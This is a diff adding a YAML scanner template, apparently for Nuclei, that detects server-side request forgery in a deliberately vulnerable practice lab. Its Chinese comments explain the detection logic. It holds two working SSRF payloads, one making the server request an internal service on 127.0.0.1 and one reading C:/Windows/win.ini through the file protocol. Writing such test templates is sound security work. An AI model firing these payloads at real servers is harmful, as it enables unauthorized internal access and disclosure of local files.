@@ -1,0 +1,84 @@
+id: vulnlab-ssrf-internal-access
+
+info:
+  name: SSRF（服务端可被诱导访问内网服务）
+  severity: critical
+  author: hediwen
+  tags: [ssrf, injection, internal-network]
+  description: |
+    请求参数被直接用作服务端请求的目标地址，未做协议与地址校验。
+
+    检测思路：让服务端去请求一个「只应该被内网访问」的服务
+    （靶场的 8090 端口，模拟内网服务），看响应里是否回显了那个服务的内容。
+
+    为什么用「内网服务的独特内容」而不是简单的状态码：
+    HTTP 200 不能说明任何事 —— 目标可能返回一个通用页面。
+    只有当响应里出现了**只有那个内网服务才会有的内容**，
+    才能确认请求真的打到了那里。
+
+    前置条件：靶场需要同时启动 8080（主靶场）和 8090（内网服务），
+    `start.sh` / `start.bat` 会自动做这件事。
+    只启 8080 的话本 PoC 不会命中 —— 那是环境问题，不是漏洞不存在。
+  reference:
+    - https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/
+
+requests:
+  # ── ① 诱导服务端访问内网服务 ────────────────────────────────────
+  - method: GET
+    path:
+      # url 参数完整编码，避免中间的 :// 被 HTTP 层或日志处理时截断
+      - "{{BaseURL}}/ssrf/low.php?url=http%3A%2F%2F127.0.0.1%3A8090%2Finternal%2Finner-service.php"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      # 真的读到了内网服务的内容
+      - type: word
+        part: body
+        words:
+          - "VULNLAB{ssrf_reached_internal_service}"
+
+      # 排除「页面只是展示了目标地址」的情况 ——
+      # 靶场页面会把用户输入的 URL 显示出来，所以光看 URL 字符串会误判。
+      # 用内网服务响应里的独特字段做判据才可靠。
+      - type: word
+        part: body
+        words:
+          - "\"service\": \"internal-admin-api\""
+        condition: or
+
+    extractors:
+      - type: regex
+        part: body
+        name: leaked_secret
+        regex:
+          - "(VULNLAB\\{ssrf_reached_internal_service\\})"
+
+  # ── ② 本地文件读取（file 协议）───────────────────────────────────
+  #
+  # 单独一条请求：它证明 SSRF 不只能打内网，还能直接读服务器本地文件。
+  # 这是 SSRF 危害的另一个维度，值得单独检测。
+  - method: GET
+    path:
+      - "{{BaseURL}}/ssrf/low.php?url=file%3A%2F%2F%2FC%3A%2FWindows%2Fwin.ini"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      # win.ini 的固定内容 —— Windows 上一定存在这个文件
+      - type: word
+        part: body
+        words:
+          - "for 16-bit app support"
+
+      - type: word
+        part: body
+        words:
+          - "无法解析"
+          - "请求失败"
+        condition: or
+        negative: true
